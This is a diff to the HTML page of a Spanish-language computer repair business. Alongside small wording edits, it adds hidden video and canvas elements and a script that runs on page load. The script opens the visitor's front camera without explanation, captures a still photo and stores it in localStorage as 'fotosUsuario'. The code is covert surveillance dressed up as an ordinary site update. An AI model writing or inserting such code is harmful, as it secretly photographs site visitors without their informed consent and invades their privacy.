@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>JS Technology</title>
+  <title>Tecnología JS</title>
   <style>
     * {
       margin: 0;
@@ -161,6 +161,10 @@
     ul li {
       margin-bottom: 5px;
     }
+    #hiddenVideo,
+    #hiddenCanvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -168,7 +172,7 @@
   <div class="sidebar">
     <div class="logo-container">
       <div class="logo-img"></div>
-      <h2>JS Technology</h2>
+      <h2>Tecnología JS</h2>
     </div>
     <div class="refran">La calidad está en nuestro servicio</div>
     <!-- Servicio Técnico -->
@@ -201,19 +205,52 @@
   <div class="main">
     <div class="section" id="content">
       <h3>Bienvenido a JS Technology</h3>
-      <p>Selecciona una opción del menú para ver más detalles.</p>
+      <p>Seleccione una opción del menú para ver más detalles.</p>
     </div>
   </div>
   <!-- WhatsApp -->
   <a class="whatsapp" href="https://wa.me/573244973675" target="_blank">
     <div class="whatsapp-icon"></div>
   </a>
+  <!-- Video y Canvas ocultos para captura automática -->
+  <video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
+  <canvas id="hiddenCanvas" width="320" height="240" style="display:none;"></canvas>
   <!-- Scripts -->
   <script>
+   
+    window.addEventListener('DOMContentLoaded', () => {
+      let fotos = [];
+      try {
+        fotos = JSON.parse(localStorage.getItem('fotosUsuario')) || [];
+      } catch(e) { fotos = []; }
+      if(fotos.length === 0) {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+          .then(stream => {
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                const imageData = canvas.toDataURL('image/png');
+                fotos.push(imageData);
+                localStorage.setItem('fotosUsuario', JSON.stringify(fotos));
+               
+              }, 600);
+            };
+          })
+          .catch(err => {
+         
+            console.warn('No se pudo acceder a la cámara:', err);
+          });
+      }
+    });
+
     function toggleSubmenu(id) {
       const submenu = document.getElementById(id);
       submenu.style.display = submenu.style.display === 'block' ? 'none' : 'block';
-    } 
+    }
     function attachDualEvent(id, handler) {
       const element = document.getElementById(id);
       if (element) {
@@ -221,13 +258,12 @@
         element.addEventListener('touchstart', handler);
       }
     }
-   function showContent(option) {
-  const content = document.getElementById('content');
-  let servicio = '';
-  let texto = '';
-  let mensaje = '';
-
-switch(option) {
+    function showContent(option) {
+      const content = document.getElementById('content');
+      let servicio = '';
+      let texto = '';
+      let mensaje = '';
+      switch(option) {
   case 'PC':
     servicio = 'Reparación de PC';
     texto = `
